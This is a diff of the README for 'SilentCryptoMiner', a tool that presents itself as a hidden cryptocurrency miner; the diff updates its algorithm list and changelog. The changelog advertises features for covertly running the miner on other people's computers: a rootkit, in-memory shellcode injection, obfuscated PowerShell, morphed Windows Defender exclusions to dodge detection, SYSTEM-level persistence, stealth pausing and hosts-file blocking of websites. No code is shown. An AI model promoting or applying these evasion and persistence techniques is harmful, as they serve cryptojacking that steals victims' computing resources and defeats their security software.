@@ -1,23 +1,25 @@
 <img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
 
-# SilentCryptoMiner v2.3.2 - Miner for ETH, ETC, XMR, RTM & more
+# SilentCryptoMiner v2.4.0 - Miner for ETH, ETC, XMR, RTM & many more
 
-A silent (hidden) cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.
+A free silent (hidden) cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.
 
 This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
 <details>
  <summary>List of algorithms</summary>
  <table>
 	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
-	<tr><td>ethash</td><td>Ethereum, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
-	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
 	<tr><td>rx/0</td><td>Monero</td></tr>
 	<tr><td>gr</td><td>Raptoreum</td></tr>
+	<tr><td>ethash</td><td>Ethereum, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
+	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
+	<tr><td>ubqhash</td><td>Ubiq</td></tr>
+	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
+	<tr><td>panthera</td><td>Scala</td></tr>
 	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
 	<tr><td>rx/arq</td><td>ArQmA</td></tr>
 	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
-	<tr><td>cn/ccx</td><td>Conceal</td></tr>
-	<tr><td>astrobwt</td><td>Dero</td></tr>
+	<tr><td>astrobwt/v2</td><td>Dero HE</td></tr>
 	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
 	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
 	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
@@ -30,6 +32,8 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
 	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
 	<tr><td>rx/wow</td><td>Wownero</td></tr>
+	<tr><td>astrobwt</td><td></td></tr>
+	<tr><td>cn/ccx</td><td></td></tr>
 	<tr><td>cn/zls</td><td></td></tr>
 	<tr><td>cn/double</td><td></td></tr>
 	<tr><td>cn/2</td><td></td></tr>
@@ -74,6 +78,26 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 
 ## Changelog
 
+### 2.4.0 (29/05/2022)
+* Added new Ubqhash (ubqhash) algorithm
+* Added new CryptoNight-GPU (cn/gpu) algorithm
+* Added new Panthera (panthera) algorithm
+* Added new AstroBWT V2 (astrobwt/v2) algorithm
+* Added new option "Stealth on Fullscreen" to pause the miner when Windows reports a fullscreen program to be open on the user running the miner
+* Added executable name to the web panel "Active Window" reporting
+* Added executable name reporting of the found "Stealth Targets" during "Stealth" to the web panel
+* Added UTF8 encoding to GPU and CPU name web panel reporting
+* Added C# shellcode injector for in-memory watchdog injection without an intermediary "Shellcode Loader"
+* Changed Task Scheduler task creation from schtasks command to powershell to greatly increase customizability of the task
+* Changed Task Scheduler task conditions and settings to the most optimal for the miner
+* Changed Task Scheduler task to start at system startup instead of any user login when "Run as System" is enabled
+* Fixed Task Scheduler task on some systems when install path contains spaces
+* Replaced many commands with obfuscated powershell versions
+* Reworked miner installation code and methods
+* Reworked miner checking loops to ensure correct web panel status reporting and better performance
+* Added support for reporting to the web panel when running at least two miners of the same miner type
+* Improved watchdog miner restoration
+* Updated the rootkit
 ### 2.3.2 (30/04/2022)
 * Changed miner to install into Program Files if installed with "Run as System" enabled
 * Changed miner to instead start from the Task Scheduler instead of CMD immediately after install if running as administrator
@@ -108,32 +132,6 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 * Fixed uninstaller
 * Removed duplicate disable sleep command
 * Updated miner
-### v2.2.1 (05/04/2022)
-* Added morphing to Windows Defender exclusion command to avoid static detection
-* Added option to run/install the miner as System instead of always doing so by default
-* Changed rootkit target program from nslookup.exe to dialer.exe and modified rootkit workflow
-* Fixed XMR difficulty negotiation
-* Fixed XMR worker name variable replacement
-* Fixed XMR CUDA library locator for unicode characters
-* Fixed missing builder events
-### v2.2.0 (01/04/2022)
-* Added custom system-wide idle detection that replaces the previous dedicated Windows API idle detection, this allows the miner to be run as "System"
-* Changed miner to be installed with the "System" user when run as administrator, which means that it will now run when the computer is started with any user
-* Added field to customize the entry name displayed in the startup registry and Task Scheduler
-* Added option to automatically delete the original miner file after installation finishes
-* Added option to disable sleep and hibernation on the computer
-* Added option to block websites/domains from being able to be accessed by using the hosts file
-* Fixed computer name and username convertions when containing non-ASCII characters
-* Changed default library and installation locations to avoid path access restrictions by some programs
-* Fixed XMR miner GPU CUDA libraries
-* Fixed missing Watchdog Loader obfuscation step when using "Pause for Obfuscation"
-* Improved GhostRider algorithm implementation
-* Changed ETH miner idle sleeping 
-* Fixed minor builder bugs
-* Cleaned up form elements
-* Added icon file error checking
-* Updated compilers
-* Updated miners
 
 [You can view the full Changelog here](CHANGELOG.md)
 
